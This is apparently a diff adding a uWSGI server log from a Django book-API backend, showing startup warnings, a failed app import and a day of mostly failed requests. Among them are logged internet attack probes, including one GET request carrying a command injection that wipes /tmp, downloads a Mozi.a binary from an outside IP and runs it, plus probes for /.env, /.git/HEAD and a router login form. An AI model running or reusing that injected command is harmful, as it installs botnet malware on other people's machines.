@@ -1,0 +1,353 @@
+*** Starting uWSGI 2.0.21 (64bit) on [Wed Apr 12 15:42:03 2023] ***
+compiled with version: 7.5.0 on 12 April 2023 06:33:26
+os: Linux-4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020
+nodename: relaystory-server
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /root/team2-BE
+writing pidfile to /tmp/project-master.pid
+detected binary path: /root/team2-BE/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/team2-BE
+your processes number limit is 3653
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /root/team2-BE/uwsgi.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.9 (default, Mar 10 2023, 16:46:00)  [GCC 8.4.0]
+Set PythonHome to /root/team2-BE/venv
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x562c78052970
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+ModuleNotFoundError: No module named 'team2-BE'
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 22754)
+spawned uWSGI worker 1 (pid: 22755, cores: 1)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/1] 172.224.252.29 () {38 vars in 518 bytes} [Wed Apr 12 16:00:56 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/2] 172.224.252.29 () {38 vars in 518 bytes} [Wed Apr 12 16:01:24 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/3] 172.224.252.29 () {38 vars in 518 bytes} [Wed Apr 12 16:03:59 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/4] 172.224.252.29 () {38 vars in 518 bytes} [Wed Apr 12 16:05:32 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/5] 172.224.252.29 () {38 vars in 518 bytes} [Wed Apr 12 16:05:39 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/6] 172.224.252.29 () {38 vars in 518 bytes} [Wed Apr 12 16:08:00 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.21 (64bit) on [Wed Apr 12 16:12:14 2023] ***
+compiled with version: 7.5.0 on 12 April 2023 06:33:26
+os: Linux-4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020
+nodename: relaystory-server
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /root/team2-BE
+writing pidfile to /tmp/project-master.pid
+detected binary path: /root/team2-BE/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /root/team2-BE
+your processes number limit is 3653
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on :8080 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:36369 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.9 (default, Mar 10 2023, 16:46:00)  [GCC 8.4.0]
+Set PythonHome to /root/team2-BE/venv
+Python main interpreter initialized at 0x5603c444fde0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5603c444fde0 pid: 23452 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+spawned uWSGI master process (pid: 23452)
+spawned uWSGI worker 1 (pid: 23455, cores: 1)
+spawned uWSGI http 1 (pid: 23456)
+/root/team2-BE/venv/lib/python3.6/site-packages/jwt/utils.py:7: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.
+  from cryptography.hazmat.primitives.asymmetric.ec import EllipticCurve
+[pid: 23455|app: 0|req: 1/1] 175.192.208.5 () {34 vars in 486 bytes} [Wed Apr 12 07:12:25 2023] GET /book/getbook?bookId=1 => generated 0 bytes in 1436 msecs (HTTP/1.1 301) 6 headers in 205 bytes (1 switches on core 0)
+[pid: 23455|app: 0|req: 2/2] 175.192.208.5 () {38 vars in 803 bytes} [Wed Apr 12 07:12:34 2023] GET /book/getbook?bookId=1 => generated 0 bytes in 1 msecs (HTTP/1.1 301) 6 headers in 205 bytes (1 switches on core 0)
+[pid: 23455|app: 0|req: 3/3] 175.192.208.5 () {38 vars in 805 bytes} [Wed Apr 12 07:12:34 2023] GET /book/getbook/?bookId=1 => generated 6260 bytes in 218 msecs (HTTP/1.1 200) 8 headers in 386 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/css/bootstrap.min.css
+[pid: 23455|app: 0|req: 4/4] 175.192.208.5 () {38 vars in 792 bytes} [Wed Apr 12 07:12:34 2023] GET /static/rest_framework/css/bootstrap.min.css => generated 2860 bytes in 13 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/js/ajax-form.js
+[pid: 23455|app: 0|req: 5/5] 175.192.208.5 () {38 vars in 765 bytes} [Wed Apr 12 07:12:34 2023] GET /static/rest_framework/js/ajax-form.js => generated 2842 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/css/prettify.css
+[pid: 23455|app: 0|req: 6/6] 175.192.208.5 () {38 vars in 782 bytes} [Wed Apr 12 07:12:34 2023] GET /static/rest_framework/css/prettify.css => generated 2845 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/css/default.css
+[pid: 23455|app: 0|req: 7/7] 175.192.208.5 () {38 vars in 780 bytes} [Wed Apr 12 07:12:34 2023] GET /static/rest_framework/css/default.css => generated 2842 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/css/bootstrap-tweaks.css
+[pid: 23455|app: 0|req: 8/8] 175.192.208.5 () {38 vars in 798 bytes} [Wed Apr 12 07:12:35 2023] GET /static/rest_framework/css/bootstrap-tweaks.css => generated 2869 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/js/jquery-3.5.1.min.js
+[pid: 23455|app: 0|req: 9/9] 175.192.208.5 () {38 vars in 779 bytes} [Wed Apr 12 07:12:35 2023] GET /static/rest_framework/js/jquery-3.5.1.min.js => generated 2863 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/js/csrf.js
+[pid: 23455|app: 0|req: 10/10] 175.192.208.5 () {38 vars in 755 bytes} [Wed Apr 12 07:12:35 2023] GET /static/rest_framework/js/csrf.js => generated 2827 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/js/prettify-min.js
+[pid: 23455|app: 0|req: 11/11] 175.192.208.5 () {38 vars in 771 bytes} [Wed Apr 12 07:12:35 2023] GET /static/rest_framework/js/prettify-min.js => generated 2851 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/js/bootstrap.min.js
+[pid: 23455|app: 0|req: 12/12] 175.192.208.5 () {38 vars in 773 bytes} [Wed Apr 12 07:12:35 2023] GET /static/rest_framework/js/bootstrap.min.js => generated 2854 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /static/rest_framework/js/default.js
+[pid: 23455|app: 0|req: 13/13] 175.192.208.5 () {38 vars in 761 bytes} [Wed Apr 12 07:12:35 2023] GET /static/rest_framework/js/default.js => generated 2836 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 23455|app: 0|req: 14/14] 175.192.208.5 () {38 vars in 774 bytes} [Wed Apr 12 07:12:35 2023] GET /favicon.ico => generated 2764 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 23455|app: 0|req: 15/15] 167.71.177.19 () {30 vars in 435 bytes} [Wed Apr 12 07:13:28 2023] GET / => generated 2713 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /http:/checkip.dyndns.org/
+[pid: 23455|app: 0|req: 16/16] 167.71.177.19 () {26 vars in 356 bytes} [Wed Apr 12 07:13:39 2023] GET http://checkip.dyndns.org/ => generated 1821 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Wed Apr 12 07:23:11 2023 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/7] 172.225.52.229 () {38 vars in 518 bytes} [Wed Apr 12 16:24:13 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/8] 172.225.52.238 () {38 vars in 518 bytes} [Wed Apr 12 16:26:49 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 1 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/9] 103.80.134.163 () {30 vars in 306 bytes} [Wed Apr 12 16:29:06 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/10] 172.225.52.238 () {38 vars in 518 bytes} [Wed Apr 12 16:31:26 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/11] 175.192.208.5 () {38 vars in 521 bytes} [Wed Apr 12 16:32:32 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/12] 146.56.183.55 () {38 vars in 460 bytes} [Wed Apr 12 16:50:07 2023] HEAD / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/13] 146.56.183.55 () {38 vars in 552 bytes} [Wed Apr 12 16:50:11 2023] HEAD / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/14] 146.56.183.55 () {52 vars in 892 bytes} [Wed Apr 12 16:50:12 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/15] 175.192.208.5 () {38 vars in 521 bytes} [Wed Apr 12 16:57:56 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/16] 175.192.208.5 () {38 vars in 521 bytes} [Wed Apr 12 16:57:57 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/17] 175.192.208.5 () {38 vars in 521 bytes} [Wed Apr 12 16:58:06 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/18] 175.192.208.5 () {38 vars in 521 bytes} [Wed Apr 12 16:58:53 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/19] 175.192.208.5 () {38 vars in 521 bytes} [Wed Apr 12 16:58:53 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/20] 107.170.252.9 () {34 vars in 380 bytes} [Wed Apr 12 17:07:28 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/21] 175.192.208.5 () {38 vars in 521 bytes} [Wed Apr 12 17:24:49 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/22] 172.225.52.239 () {38 vars in 540 bytes} [Wed Apr 12 17:37:42 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/23] 172.225.52.239 () {38 vars in 540 bytes} [Wed Apr 12 17:39:29 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/24] 172.225.52.239 () {38 vars in 540 bytes} [Wed Apr 12 17:48:01 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/25] 172.225.52.239 () {38 vars in 540 bytes} [Wed Apr 12 17:48:27 2023] GET /book/getbook?bookId=1 => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/26] 193.35.18.243 () {48 vars in 878 bytes} [Wed Apr 12 18:21:32 2023] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/27] 193.32.162.159 () {44 vars in 783 bytes} [Wed Apr 12 18:28:43 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/28] 171.35.161.168 () {34 vars in 653 bytes} [Wed Apr 12 19:23:10 2023] GET /shell?cd+/tmp;rm+-rf+*;wget+http://171.35.161.168:53594/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/29] 87.236.176.226 () {36 vars in 484 bytes} [Wed Apr 12 19:24:22 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/30] 162.243.144.9 () {34 vars in 427 bytes} [Wed Apr 12 19:39:33 2023] GET /druid/index.html => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/31] 141.98.6.81 () {40 vars in 567 bytes} [Wed Apr 12 20:38:15 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/32] 64.62.197.54 () {34 vars in 487 bytes} [Wed Apr 12 21:09:37 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/33] 64.62.197.60 () {34 vars in 506 bytes} [Wed Apr 12 21:10:57 2023] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/34] 64.62.197.51 () {34 vars in 515 bytes} [Wed Apr 12 21:11:34 2023] GET /geoserver/web/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/35] 193.32.162.159 () {44 vars in 783 bytes} [Wed Apr 12 21:18:59 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/36] 179.43.177.242 () {30 vars in 343 bytes} [Wed Apr 12 22:47:15 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/37] 193.32.162.159 () {44 vars in 783 bytes} [Wed Apr 12 23:01:32 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/38] 68.183.3.198 () {32 vars in 413 bytes} [Thu Apr 13 00:14:54 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.0 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/39] 66.240.236.116 () {34 vars in 396 bytes} [Thu Apr 13 00:46:27 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/40] 193.35.18.243 () {40 vars in 630 bytes} [Thu Apr 13 01:16:17 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/41] 34.79.57.245 () {42 vars in 564 bytes} [Thu Apr 13 01:40:50 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/42] 179.43.177.242 () {48 vars in 879 bytes} [Thu Apr 13 02:00:13 2023] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/43] 20.22.247.241 () {26 vars in 304 bytes} [Thu Apr 13 04:36:38 2023] HEAD /robots.txt => generated 21 bytes in 0 msecs (HTTP/1.0 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/44] 51.254.59.113 () {32 vars in 452 bytes} [Thu Apr 13 05:14:35 2023] GET / => generated 21 bytes in 14 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+Thu Apr 13 05:34:55 2023 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /json/49.50.160.217 (ip 193.35.18.12) !!!
+Thu Apr 13 05:34:55 2023 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET /json/49.50.160.217 (193.35.18.12)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/45] 193.35.18.12 () {32 vars in 406 bytes} [Thu Apr 13 05:34:55 2023] GET /json/49.50.160.217 => generated 0 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 0 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/46] 170.64.168.28 () {34 vars in 485 bytes} [Thu Apr 13 05:49:02 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/47] 170.64.168.28 () {34 vars in 521 bytes} [Thu Apr 13 05:49:02 2023] GET /client/get_targets => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/48] 170.64.168.28 () {34 vars in 399 bytes} [Thu Apr 13 05:49:02 2023] GET /upl.php => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/49] 170.64.168.28 () {34 vars in 497 bytes} [Thu Apr 13 05:49:03 2023] GET /geoip/ => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/50] 170.64.168.28 () {36 vars in 585 bytes} [Thu Apr 13 05:49:03 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/51] 170.64.168.28 () {34 vars in 507 bytes} [Thu Apr 13 05:49:04 2023] GET /favicon.ico => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/52] 45.79.128.205 () {34 vars in 488 bytes} [Thu Apr 13 06:07:05 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/53] 185.180.143.79 () {34 vars in 490 bytes} [Thu Apr 13 06:48:27 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/54] 193.141.60.47 () {34 vars in 394 bytes} [Thu Apr 13 06:49:29 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/55] 23.172.112.77 () {30 vars in 338 bytes} [Thu Apr 13 07:22:48 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/56] 179.43.177.242 () {48 vars in 879 bytes} [Thu Apr 13 08:51:04 2023] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/57] 149.129.50.37 () {34 vars in 573 bytes} [Thu Apr 13 09:11:47 2023] GET /proxychecker/index.php => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/58] 103.203.57.1 () {32 vars in 400 bytes} [Thu Apr 13 09:36:31 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/59] 194.87.151.116 () {48 vars in 879 bytes} [Thu Apr 13 10:12:13 2023] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/60] 193.35.18.251 () {48 vars in 878 bytes} [Thu Apr 13 11:03:47 2023] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/61] 5.62.47.204 () {36 vars in 588 bytes} [Thu Apr 13 11:08:38 2023] GET /.env => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/62] 5.62.47.204 () {40 vars in 695 bytes} [Thu Apr 13 11:08:39 2023] POST / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/63] 165.22.93.26 () {42 vars in 678 bytes} [Thu Apr 13 11:11:23 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/64] 94.102.61.10 () {34 vars in 488 bytes} [Thu Apr 13 12:31:29 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/65] 185.180.143.136 () {34 vars in 491 bytes} [Thu Apr 13 13:47:43 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/66] 193.35.18.251 () {48 vars in 878 bytes} [Thu Apr 13 14:48:14 2023] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/67] 79.110.62.233 () {40 vars in 569 bytes} [Thu Apr 13 16:04:45 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/68] 137.184.74.35 () {32 vars in 428 bytes} [Thu Apr 13 16:31:43 2023] GET /.git/HEAD => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/69] 107.170.236.11 () {34 vars in 396 bytes} [Thu Apr 13 17:05:43 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (0 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/70] 194.87.151.116 () {48 vars in 879 bytes} [Thu Apr 13 17:47:35 2023] POST /boaform/admin/formLogin => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
+[pid: 22755|app: -1|req: -1/71] 185.225.74.42 () {40 vars in 569 bytes} [Thu Apr 13 18:05:40 2023] GET / => generated 21 bytes in 0 msecs (HTTP/1.1 500) 2 headers in 83 bytes (1 switches on core 0)
+--- no python application found, check your startup logs for errors ---
